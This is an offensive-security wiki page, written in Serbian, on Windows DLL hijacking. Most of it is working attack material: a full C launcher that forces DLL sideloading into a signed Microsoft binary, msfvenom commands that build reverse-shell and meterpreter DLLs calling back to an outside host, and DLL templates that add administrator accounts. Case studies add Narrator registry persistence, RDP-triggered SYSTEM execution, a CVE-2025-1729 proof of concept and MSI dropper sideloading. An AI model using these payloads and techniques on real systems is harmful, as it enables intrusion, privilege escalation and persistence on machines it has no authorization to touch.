# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju pouzdanom aplikacijom da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Pretežno se koristi za code execution, postizanje persistence, a ređe za privilege escalation. Uprkos tome što je ovde fokus na escalation, metoda hijackinga ostaje ista bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking se koristi nekoliko metoda, čija efikasnost zavisi od strategije učitavanja DLL-a u aplikaciji:

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, opcionalno koristeći DLL Proxying da se sačuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a za koji će aplikacija pomisliti da je nepostojeći potreban DLL.
4. **DLL Redirection**: Izmena parametara pretrage kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` fajlovi da bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u WinSxS direktorijumu, metoda često povezana sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika uz kopiranu aplikaciju, nalik tehnikama Binary Proxy Execution.

> [!TIP]
> Za korak-po-korak lanac koji slaže HTML staging, AES-CTR konfiguracije i .NET implantate preko DLL sideloading-a, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih Dll-ova

Najčešći način za pronalaženje nedostajućih DLL-ova u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, i podešavanje sledeća 2 filtera:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i samo prikazati **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **missing dlls in general** ostavite ovo da radi nekoliko **sekundi**.  
Ako tražite **missing dll** unutar određenog izvršnog fajla, trebalo bi da postavite drugi filter poput "Process Name" "contains" `<exec name>`, pokrenete ga i zaustavite hvatanje događaja.

## Eksploatisanje nedostajućih Dll-ova

Da bismo ostvarili podizanje privilegija, najbolja prilika je da možemo da zapišemo DLL koji će proces sa višim privilegijama pokušati da učita u nekom od mesta gde će se pretraživati. Dakle, možemo da zapišemo DLL u folderu gde se taj DLL traži pre foldera u kome je originalni DLL (neobičan slučaj), ili možemo da zapišemo u neki folder gde će se DLL tražiti, a originalni DLL ne postoji ni u jednom folderu.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows aplikacije traže DLL-ove prateći skup unapred definisanih putanja pretrage, u određenom redosledu. Problem DLL hijacking-a nastaje kada se zlonamerni DLL strateški postavi u neki od tih direktorijuma, tako da se učita pre autentičnog DLL-a. Rešenje je da aplikacija koristi apsolutne putanje pri pozivanju potrebnih DLL-ova.

Ispod možete videti redosled pretrage DLL-ova na 32-bitnim sistemima:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ovo je **podrazumevani** redosled pretrage sa **SafeDllSearchMode** uključenim. Kada se isključi, trenutni direktorijum prelazi na drugo mesto. Da biste isključili ovu opciju, kreirajte vrednost registra HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode i postavite je na 0 (podrazumevano je uključeno).

Ako se [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte u vidu da DLL može biti učitan navođenjem apsolutne putanje umesto samo imena. U tom slučaju taj DLL će se tražiti samo na toj putanji (ako DLL ima zavisnosti, one će se tražiti kao da su učitane po imenu).

Postoje i drugi načini da se menja redosled pretrage, ali ih ovde neću objašnjavati.

### Prisiljavanje sideloadinga preko RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na putanju pretrage DLL-ova novokreiranog procesa je da postavite polje DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa koristeći ntdll-ove native API-je. Ako ovde navedete direktorijum pod kontrolom napadača, ciljnom procesu koji razrešava uvezani DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flag-ova) može se naterati da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Sastavite process parameters pomoću RtlCreateProcessParametersEx i navedite custom DllPath koji pokazuje na direktorijum pod vašom kontrolom (npr. direktorijum gde se nalazi vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljna binarka razreši DLL po imenu, loader će konsultovati ovaj DllPath tokom rešavanja, omogućavajući pouzdan sideloading čak i kada se zlonamerni DLL ne nalazi u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na kreirani child process; razlikuje se od SetDllDirectory, koja utiče samo na trenutni process.
- Cilj mora da importuje ili pozove LoadLibrary za DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu biti hijackovane. Forwarded exports i SxS mogu promeniti prioritet.

Minimalan C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Pun C primer: forsiranje DLL sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavite zlonamerni xmllite.dll (export-uje potrebne funkcije ili radi kao proxy ka pravom) u vaš DllPath direktorijum.
- Pokrenite potpisani binarni fajl za koji je poznato da traži xmllite.dll po imenu koristeći gore opisanu tehniku. Loader rešava import preko prosleđenog DllPath i sideloads your DLL.

Ova tehnika je primećena u stvarnom svetu da pokreće multi-stage sideloading chains: inicijalni launcher ispusta helper DLL, koji potom pokreće Microsoft-signed, hijackable binarni fajl sa custom DllPath da bi primorao učitavanje napadačevog DLL-a iz staging directory.

#### Izuzeci u redosledu pretrage DLL-a prema Windows dokumentaciji

Određeni izuzeci od standardnog redosleda pretrage DLL-ova su navedeni u Windows dokumentaciji:

- Kada se susretne **DLL koji deli ime sa jednim koji je već učitan u memoriji**, sistem preskače uobičajenu pretragu. Umesto toga, izvršava proveru za redirection i manifest pre nego što podrazumevano koristi DLL koji je već u memoriji. **U ovom scenariju sistem ne vrši pretragu za DLL**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju known DLL-a, zajedno sa bilo kojim njegovim zavisnim DLL-ovima, **preskačući proces pretrage**. Registry ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za tim zavisnim DLL-ovima se obavlja kao da su naznačeni samo po svojim **module names**, bez obzira na to da li je inicijalni DLL bio označen putem pune putanje.

### Povišavanje privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **drugim privilegijama** (horizontal or lateral movement), a kojem **nedostaje DLL**.
- Osigurajte da postoji **write access** za bilo koji **direktorijum** u kojem će se tražiti **DLL**. Ta lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path-a.

Da, zahteve je teško pronaći jer je **po podrazumevanju pomalo čudno pronaći privilegovani izvršni fajl kojem nedostaje DLL** i još je **čudnije imati write permissions na folder unutar system path-a** (po podrazumevanju to ne možete). Međutim, u pogrešno konfigurisanom okruženju ovo je moguće.\
U slučaju da imate sreće i ispunjavate zahteve, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Čak i ako je **glavni cilj projekta da bypass UAC**, tamo možete naći **PoC** za Dll hijacking za verziju Windows-a koju možete iskoristiti (verovatno samo menjajući putanju foldera u kojem imate write permissions).

Imajte na umu da možete **proveriti svoja prava u folderu** radeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proveri dozvole svih direktorijuma unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršnog fajla i exports dll-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič o tome kako **abuse Dll Hijacking to escalate privileges** sa dozvolama za pisanje u **System Path folder** pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Example

Ako pronađete iskoristiv scenario, jedna od najvažnijih stvari za uspešno iskorišćavanje bi bila da **create a dll that exports at least all the functions the executable will import from it**. Takođe, imajte na umu da Dll Hijacking može biti koristan za [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili od[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **next sectio**n možete naći neke **osnovne dll kodove** koji mogu biti korisni kao **templates** ili za kreiranje **dll-a sa neobaveznim funkcijama koje su eksportovane**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **execute your malicious code when loaded**, ali takođe i da **expose** i **work** kao što se očekuje prosleđivanjem svih poziva pravoj biblioteci.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **indicate an executable and select the library** koju želite da proxify-ujete i **generate a proxified dll** ili **indicate the Dll** i **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Nabavite meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vlastito

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora **export several functions** koje će učitati proces žrtve; ako te funkcije ne postoje, **binary neće moći da ih učita** i **exploit će propasti**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL пример са креирањем корисника</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivu, jezički-specifičnu lokalizacionu DLL koja može biti hijacked for arbitrary code execution and persistence.

Ključne činjenice
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. Da biste ostali tihi, pri attach-u nabrojite (enumerate) Narrator thread-ove, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i pozovite `SuspendThread` na njoj; nastavite u sopstvenoj niti. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa gore navedenim, pokretanje Narrator učitava zasađen DLL. Na secure desktop-u (logon screen) pritisnite CTRL+WIN+ENTER da pokrenete Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se preko RDP-a na host; na logon screen-u pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje prestaje kada se RDP sesija zatvori — inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni Accessibility Tool (AT) registry unos (npr. CursorIndicator), izmeniti ga da pokazuje na proizvoljan binary/DLL, importovati ga, pa zatim postaviti `configuration` na taj AT naziv. Ovo posreduje izvršavanje proizvoljnog koda unutar Accessibility framework-a.

Notes
- Pisanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Cela payload logika može da živi u `DLL_PROCESS_ATTACH`; nisu potrebni exporti.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu (`TPQMAssistant.exe`), praćeno kao **CVE-2025-1729**.

### Detalji ranjivosti

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se izvršava svakodnevno u 9:30 u kontekstu prijavljenog korisnika.
- **Directory Permissions**: Writable by `CREATOR OWNER`, što omogućava lokalnim korisnicima da postave proizvoljne fajlove.
- **DLL Search Behavior**: Pokušava prvo da učita `hostfxr.dll` iz svog working directory-ja i loguje "NAME NOT FOUND" ako nedostaje, što ukazuje na prioritet pretrage lokalnog direktorijuma.

### Implementacija exploita

Napadač može postaviti zlonamerni `hostfxr.dll` stub u isti direktorijum, iskorišćavajući nedostajući DLL da ostvari izvršavanje koda u kontekstu korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL se pokreće u administratorovoj sesiji na medium integrity.
4. Povežite standardne UAC bypass tehnike kako biste eskalirali privilegije sa medium integrity na SYSTEM.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Napadači često kombinuju MSI-based droppere sa DLL Side-Loading-om kako bi izvršili payload pod pouzdanim, potpisanim procesom.

Chain overview
- Korisnik preuzme MSI. Tokom GUI instalacije, CustomAction se tiho izvršava (npr. LaunchApplication ili VBScript action), rekonstruišući sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se potpisani EXE pokrene, Windows DLL search order učitava wsc.dll iz radnog direktorijuma prvi, izvršavajući napadačev kod pod potpisanim roditeljem (ATT&CK T1574.001).

MSI analiza (šta tražiti)
- CustomAction tabela:
- Potražite unose koji pokreću izvršne fajlove ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji izvršava ugrađeni fajl u pozadini.
- U Orca (Microsoft Orca.exe), pregledajte CustomAction, InstallExecuteSequence i Binary tabele.
- Ugrađeni/podeljeni payload-i u MSI CAB:
- Administrativno ekstrahovanje: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Potražite više malih fragmenata koji se konkateniraju i dekriptuju pomoću VBScript CustomAction. Uobičajen tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktično sideloading sa wsc_proxy.exe
- Postavite ova dva fajla u isti folder:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: maliciozni DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, izgradite proxy DLL i prosledite potrebne exports pravoj biblioteci dok pokrećete payload u DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve vezane za export, koristite proxying framework (npr., DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na rešavanje imena DLL od strane host binarija. Ako host koristi apsolutne putanje ili safe loading flags (npr., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack možda neće uspeti.
- KnownDLLs, SxS, i forwarded exports mogu uticati na prioritet i moraju se uzeti u obzir pri izboru host binarija i skupa export-ovanih funkcija.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
